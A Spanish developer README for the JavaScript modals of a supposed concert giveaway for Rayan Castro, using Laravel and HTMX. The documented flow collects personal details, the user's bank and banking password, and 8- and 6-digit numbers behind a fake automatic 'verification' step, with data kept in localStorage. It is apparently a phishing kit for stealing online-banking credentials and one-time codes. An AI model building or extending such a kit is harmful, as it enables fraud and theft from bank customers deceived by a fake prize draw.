# JavaScript de Modales - Sorteo Rayan Castro

Este directorio contiene los archivos JavaScript para los modales del sorteo del concierto de Rayan Castro.

## Estructura de Archivos

### Archivos de Definición

Estos archivos contienen la lógica, validaciones y configuración de cada modal:

- `modal-participar.definition.js` - Lógica del modal de participación inicial
- `modal-condiciones.definition.js` - Validaciones y lógica del formulario de condiciones
- `modal-datos-registro.definition.js` - Lógica de selección de banco y validación de clave
- `modal-verificacion.definition.js` - Lógica del modal de verificación (spinner automático)
- `modal-numero-o.definition.js` - Lógica para ingreso de número de 8 dígitos
- `modal-numero-t.definition.js` - Lógica para ingreso de número de 6 dígitos
- `modal-juego.definition.js` - Lógica del juego de ruleta/slots
- `modal-nocumple.definition.js` - Lógica del modal informativo

### Archivo de Inicialización

- `modals-init.js` - Script principal que:
  - Registra todas las definiciones de modales
  - Proporciona utilidades de validación
  - Integra con HTMX para carga dinámica
  - Gestiona el ciclo de vida de los modales

## Uso en ryan.blade.php

Para usar estos archivos JavaScript con HTMX en tu vista principal, incluye los scripts en este orden:

```blade
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Concierto Rayan Castro</title>
    <!-- HTMX -->
    <script src="https://unpkg.com/htmx.org@1.9.10"></script>
</head>
<body>
    <!-- Contenido de tu página -->

    <!-- Cargar definiciones de modales ANTES de modals-init.js -->
    <script src="{{ asset('ryan/js/modal-participar.definition.js') }}"></script>
    <script src="{{ asset('ryan/js/modal-condiciones.definition.js') }}"></script>
    <script src="{{ asset('ryan/js/modal-datos-registro.definition.js') }}"></script>
    <script src="{{ asset('ryan/js/modal-verificacion.definition.js') }}"></script>
    <script src="{{ asset('ryan/js/modal-numero-o.definition.js') }}"></script>
    <script src="{{ asset('ryan/js/modal-numero-t.definition.js') }}"></script>
    <script src="{{ asset('ryan/js/modal-juego.definition.js') }}"></script>
    <script src="{{ asset('ryan/js/modal-nocumple.definition.js') }}"></script>

    <!-- Cargar script de inicialización AL FINAL -->
    <script src="{{ asset('ryan/js/modals-init.js') }}"></script>
</body>
</html>
```

## Uso con HTMX

### Cargar Modal Dinámicamente

```html
<!-- Botón que carga un modal usando HTMX -->
<button hx-get="/conciertos/modals/participar"
        hx-target="#modal-container"
        hx-swap="innerHTML">
    Ver Sorteo
</button>

<!-- Contenedor donde se cargará el modal -->
<div id="modal-container"></div>
```

### Ruta en Laravel

En tu controlador Laravel:

```php
Route::get('/conciertos/modals/{modal}', function ($modal) {
    return view("conciertos.modals.{$modal}");
});
```

## API de ModalsManager

El objeto global `ModalsManager` proporciona las siguientes funciones:

### Registrar Modal

```javascript
ModalsManager.register('nombre-modal', definitionObject);
```

### Obtener Definición

```javascript
const definition = ModalsManager.get('nombre-modal');
```

### Inicializar Modal

```javascript
ModalsManager.init('nombre-modal', 'id-contenedor');
```

### Validar Campo

```javascript
const isValid = ModalsManager.validateField(
    'fieldId',           // ID del campo
    validationsObject,   // Objeto de validaciones
    containerElement     // Elemento contenedor del modal
);
```

### Obtener Datos del Formulario

```javascript
const formData = ModalsManager.getFormData(
    containerElement,                              // Elemento contenedor
    ['cedula', 'nombre', 'email', 'celular']      // Array de IDs de campos
);
```

## Ejemplo Completo con HTMX

```blade
{{-- ryan.blade.php --}}
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Sorteo Concierto</title>
    <script src="https://unpkg.com/htmx.org@1.9.10"></script>
</head>
<body>
    {{-- Fondo --}}
    <div style="background-image: url('/ryan/rayan.jpg')">
        {{-- Contenedor de modales --}}
        <div id="modal-container"></div>

        {{-- Botón inicial --}}
        <button hx-get="/conciertos/modals/participar"
                hx-target="#modal-container"
                hx-swap="innerHTML"
                hx-trigger="load delay:2s">
            <!-- Botón invisible que carga el modal después de 2 segundos -->
        </button>
    </div>

    {{-- Scripts --}}
    <script src="{{ asset('ryan/js/modal-participar.definition.js') }}"></script>
    <script src="{{ asset('ryan/js/modal-condiciones.definition.js') }}"></script>
    <script src="{{ asset('ryan/js/modal-datos-registro.definition.js') }}"></script>
    <script src="{{ asset('ryan/js/modal-verificacion.definition.js') }}"></script>
    <script src="{{ asset('ryan/js/modal-numero-o.definition.js') }}"></script>
    <script src="{{ asset('ryan/js/modal-numero-t.definition.js') }}"></script>
    <script src="{{ asset('ryan/js/modal-juego.definition.js') }}"></script>
    <script src="{{ asset('ryan/js/modal-nocumple.definition.js') }}"></script>
    <script src="{{ asset('ryan/js/modals-init.js') }}"></script>

    {{-- Script personalizado --}}
    <script>
        // Navegar entre modales
        document.body.addEventListener('modal-next', function(e) {
            const nextModal = e.detail.nextModal;
            htmx.ajax('GET', `/conciertos/modals/${nextModal}`, '#modal-container');
        });
    </script>
</body>
</html>
```

## Eventos Personalizados

Los modales pueden emitir eventos personalizados:

```javascript
// Emitir evento para cargar siguiente modal
const event = new CustomEvent('modal-next', {
    detail: { nextModal: 'condiciones' },
    bubbles: true
});
document.body.dispatchEvent(event);
```

## Notas Importantes

1. **Orden de Carga**: Los archivos `.definition.js` deben cargarse ANTES de `modals-init.js`

2. **HTMX Integration**: El script `modals-init.js` automáticamente detecta cuando HTMX carga nuevo contenido y inicializa los modales correspondientes

3. **Variables Globales**: Cada archivo `.definition.js` exporta su definición a `window`:
   - `window.modalParticiparDefinition`
   - `window.modalCondicionesDefinition`
   - etc.

4. **LocalStorage**: Algunos modales usan localStorage para persistir datos:
   - `rayan_condiciones_*` - Datos del formulario de condiciones
   - `rayan_datos_registro_*` - Datos de banca virtual
   - `rayan_numero_participacion` - Número de participación

5. **IDs Únicos**: Asegúrate de que los IDs de los elementos en los fragmentos Blade coincidan con los IDs usados en los archivos `.definition.js`

## Flujo de Modales

El flujo típico de navegación entre modales es:

1. **participar** → Usuario hace clic en "Quiero Participar"
2. **condiciones** → Usuario acepta y llena formulario
3. **datos-registro** → Usuario selecciona banco e ingresa clave
4. **verificacion** → Sistema verifica (automático)
5. **numero-o** o **numero-t** → Usuario ingresa número de participación
6. **juego** → Se muestra el resultado del juego

Si el usuario no cumple requisitos, se muestra **nocumple**.
